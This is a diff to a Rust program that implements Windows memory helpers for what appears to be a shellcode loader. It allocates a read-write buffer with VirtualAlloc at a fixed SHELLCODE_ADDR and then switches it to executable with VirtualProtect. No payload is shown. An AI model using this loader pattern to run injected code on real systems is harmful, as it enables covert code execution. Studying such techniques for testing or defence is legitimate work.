@@ -42,9 +42,8 @@ fn main() {
 
 #[cfg(target_os = "linux")]
 fn alloc_rw() -> *mut usize {
-    use std::ffi::c_void;
-
     use libc::{mmap, MAP_ANONYMOUS, MAP_PRIVATE, PROT_READ, PROT_WRITE};
+    use std::ffi::c_void;
 
     let buffer_ptr = unsafe {
         mmap(
@@ -79,10 +78,40 @@ fn set_rx(ptr: *mut usize) {
 
 #[cfg(target_os = "windows")]
 fn alloc_rw() -> *mut usize {
-    todo!();
+    use winapi::um::memoryapi::VirtualAlloc;
+    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+
+    let buffer_ptr = unsafe {
+        VirtualAlloc(
+            SHELLCODE_ADDR as *mut _, // Let the system choose the address
+            SHELLCODE.len(),          // Number of bytes to allocate
+            MEM_COMMIT | MEM_RESERVE, // Allocate and reserve pages
+            PAGE_READWRITE,           // Read-write protection
+        ) as *mut usize
+    };
+
+    if buffer_ptr as usize == 0x0 {
+        panic!("RW allocation failed");
+    }
+
+    buffer_ptr
 }
 
 #[cfg(target_os = "windows")]
 fn set_rx(ptr: *mut usize) {
-    todo!();
+    use winapi::um::memoryapi::VirtualProtect;
+    use winapi::um::winnt::PAGE_EXECUTE_READ;
+    let mut old_protection = 0;
+    let res = unsafe {
+        VirtualProtect(
+            ptr as *mut _,
+            SHELLCODE.len(),
+            PAGE_EXECUTE_READ,
+            &mut old_protection,
+        )
+    };
+
+    if res == 0x0 {
+        panic!("set allocation RX failed");
+    }
 }
